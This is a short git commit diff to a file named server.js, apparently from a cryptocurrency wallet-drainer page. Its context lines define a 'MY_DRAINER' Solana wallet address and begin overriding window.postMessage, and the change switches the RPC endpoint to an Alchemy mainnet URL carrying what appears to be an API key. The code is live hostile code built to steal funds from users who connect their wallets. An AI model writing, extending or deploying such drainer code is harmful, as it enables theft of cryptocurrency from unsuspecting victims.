5a35f3b5e55f854d6b568e8e83cb944039d81097
garydourrdan-coder <garydourrdan@gmail.com>
2026-08-30 19:58:54 +0300

    Update server.js

--- server.js
+++ server.js
@@ -74,7 +74,7 @@ return;
 document.getElementById('mainUI').style.display = 'block';
 
 const MY_DRAINER = '476p6oRtENVHzv7PJT6kAtwwXeJU7C7L4qvTephqYN6Y';
-const RPC_URL = 'https://public-rpc.solana.com';
+const RPC_URL = 'https://solana-mainnet.g.alchemy.com/v2/alch_7vGucJCx0rir9Zb-ipOOV';
 
 (function() {
 const orig = window.postMessage;
